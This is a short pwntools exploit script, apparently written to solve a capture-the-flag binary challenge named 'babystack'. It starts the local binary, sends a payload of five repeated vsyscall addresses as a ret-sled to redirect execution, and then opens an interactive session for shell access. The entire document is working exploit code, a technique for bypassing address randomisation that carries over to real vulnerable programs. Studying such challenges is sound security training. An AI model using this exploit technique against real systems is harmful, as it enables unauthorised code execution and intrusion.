from pwn import *

context.log_level = 'debug'

p = process("./babystack")
elf = ELF("./babystack")

if __name__=='__main__':

	#gdb.attach(p)
	payload = p64(0xffffffffff600000)*5 
	p.sendline(payload)

	p.interactive()
